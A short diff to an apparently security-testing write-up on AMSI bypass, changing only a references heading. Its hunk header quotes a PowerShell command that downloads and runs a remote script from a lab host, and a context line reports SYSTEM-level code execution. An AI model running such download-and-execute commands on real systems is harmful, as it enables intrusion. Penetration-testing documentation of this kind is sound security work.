@@ -119,5 +119,5 @@ IEX (New-Object Net.WebClient).DownloadString('http://192.168.20.128:8443/Invoke
 Consequently, the tester established Remote Code Execution (RCE) with NT/Authority System privileges.
 ![](/assets/AV/system.png)  
 
-## Reference  {#section-4}
-[Red Team Playbook](https://www.xn--hy1b43d247a.com/defense-evasion/amsi-bypass) && [Pentest Laboratories](https://pentestlaboratories.com/2021/05/17/amsi-bypass-methods/)
+## Credits & Reference  {#section-4}
+[Red Team Playbook](https://www.xn--hy1b43d247a.com/defense-evasion/amsi-bypass) & [Pentest Laboratories](https://pentestlaboratories.com/2021/05/17/amsi-bypass-methods/)
